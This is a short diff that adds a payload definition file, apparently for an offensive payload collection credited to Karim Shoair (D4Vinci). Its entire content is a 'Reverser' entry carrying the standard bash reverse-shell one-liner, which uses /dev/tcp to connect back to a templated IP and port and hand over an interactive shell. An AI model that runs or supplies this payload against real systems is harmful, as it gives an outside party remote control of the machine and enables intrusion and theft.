@@ -1,0 +1,7 @@
+[Info]
+Author      = Karim shoair (D4Vinci)
+Description = Interactive shell via bash's builtin /dev/tcp.
+
+[Payload]
+Type     = Reverser
+Payload  = bash -i >& /dev/tcp/{ip}/{port} 0>&1
